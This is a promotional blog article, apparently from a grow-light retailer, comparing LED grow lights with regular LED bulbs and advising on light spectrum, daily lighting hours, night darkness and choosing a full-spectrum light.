<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/grow_light_vs_regular_led_light.jpg?v=1605679235" alt="medic grow led grow light vs regular led light"></p>
<div><p>However, we cannot use a regular LED light as a <a href="https://en.wikipedia.org/wiki/Grow_light" target="_blank" title="grow light" rel="noopener noreferrer">grow light</a>, because they are not created equally.</p><p>Regular lights only provide illumination; that is to say, they are engineered as an artificial light source in order to lighten your dark spaces. They are comprised of narrow spectral wavelengths and usually do not have the proper spectrum of light to support photosynthesis.</p></div>
<div><p>On the other hand, grow lights are specifically designed to generate the right amount of light so plants can photosynthesize.</p><p>We've listed several areas where you can differentiate normal bulbs from grow lights:</p><p><strong>Spectrum</strong></p></div>
<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/different_colors_effects_on_plants.jpg?v=1605683978" alt="different colors effects on plants"></p>
<div><p>Many LED grow light manufacturers perform numerous experiments and study thousands of <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6524371/" target="_blank" title="light spectrums" rel="noopener noreferrer">scientific reports about the specific light color wavelengths</a> so that they can produce perfect grow lights with several wavelength colors that plants need. They are: red and infrared, blue and ultraviolet, and green.</p><p>Among these colors, blue and red wavelengths are the most important to plants. Blue is responsible for leafy growth and the red for flowering and budding. To start the seeds, grow lights should produce a lot of blue light which is the most important factor during the early growth stages. And when it's time to bloom, LED lights begin to emit red spectrum to promote plant growth.</p><p>Ultraviolet light guides the plants to flower and it helps sterilization. Green is less liked by plants, so grow lights have less of a green element, but it could improve the rate of leaf expansion and stem elongation, which in turn results in higher biomass accumulation (yield).</p></div>
<div><p>Infrared is not visible to the eyes. It is less effective than red and blue, but it will penetrate deeper and through the leaf, which increases cell expansion so you will get numbers of leaves and increase branch sizes in the end.</p><p><strong>Efficiency</strong></p></div>
<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/grow_light_efficiency.jpg?v=1605686310" alt="grow light efficiency"></p>

<div><p>Regular LED bulbs have a low light output per watt, which means that it takes more energy to produce the same light. Standard fluorescent lights are twice as efficient as normal bulbs, while LED grow lights are about five times more efficient than similar regular bulbs.</p><p><strong>Heat Dissipation</strong></p></div>
<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/grow_light_feat_dissipation.png?v=1605686876" alt="grow light feat dissipation"></p>
<div><p>Many regular lights produced much heat and should be hung no closer than 24 inches to avoid burning the plant. They also require a ventilation system to remove the heat from the room. Grow lights stay much cooler and can be placed about four inches above plants for maximum effectiveness. Moreover, modern LED lights are now engineered to give off heat passively, either by use of a heat sink or by diverting heat away from the diodes.</p><p><strong>Life Expectancy</strong></p></div>
<div><p>Regular lamps only have an average lifespan of 750 hours, but many good-quality <a href="https://medicgrow.com/products/medic-grow-led-grow-light-ez-6" target="_blank" title="long lifespan led grow light" rel="noopener noreferrer">LED grow lights</a> last approximately 50,000 hours, depending on wattage. That's a big difference!</p></div>
<h2><strong>How Many Hours a Day Should Grow Lights be on?</strong></h2>
<div><p>Every plant will require different types and amounts of light. Some do better in colder and less sunny areas than others. Plants that will produce fruits and vegetables will likely need more light. Plan on keeping your LED light on for at least 14-16 hours per day. Keep them on a timer if possible to ensure they operate on a 14-16 cycle.</p></div>
<h2><strong>Should I Turn off the Light at the Night?</strong></h2>
<p>Yes you should, plants need to rest too. Night gives plants time to eat, rest, and store enough energy. While photosynthesis ceases, plants begin to respire.</p>
<p>During the day time, plants absorb enough light and nutrients to supply plant cells. At night, this process continues but slowly turns the energy into carbohydrates which plants store for later use.</p>
<div><p>So basically, the lack of light allows plants to reset themselves and move the nutrients to where they'll be used when light arrives the next day.</p></div>
<h2><strong>Can Too Much Light Kill a Plant?</strong></h2>
<p>Well, if your plants are in the vegetative stage, it’s okay to keep your grow light on for 24 hours. Even though 24 hours of light is not recommended, it won’t kill your plants.</p>
<div><p>However, when it comes to flowering phase, too much light will prevent them entering the blooming stage even if it has started budding.</p></div>
<h2><strong>What LED Grow Light Should I Buy?</strong></h2>
<p>Although LED grow lights perform better than traditional lights, you should buy a grow light equipped with a perfect wavelength combination for your plants.</p>
<div><p><a href="https://medicgrow.com/blogs/news/how-to-pick-a-best-led-grow-light" target="_blank" title="led grow light wavelengths" rel="noopener noreferrer">As discusse</a><a href="https://medicgrow.com/blogs/news/led-grow-light-distance-chart-how-far-should-i-hang-the-grow-light-from-my-plants" target="_blank" title="plants different stages" rel="noopener noreferrer">d</a><a href="https://medicgrow.com/blogs/news/how-to-pick-a-best-led-grow-light" target="_blank" title="led grow light wavelengths" rel="noopener noreferrer"> earlier</a>, wavelengths facilitate various phases of plant growth, such as germination, vegetation, or flowering. For example, LEDs that are perfect for growing tomatoes may not be as effective with cannabis.</p><p>Many LED grow light manufacturers bring out an adjustable full spectrum LED grow light which produces different wavelengths to stimulate plants at different stages.</p></div>
<div><p>So if the LEDs are needed to take care of your indoor plant at different stages, there is a good option of purchasing a full spectrum LED grow light or an adjustable one.</p></div>
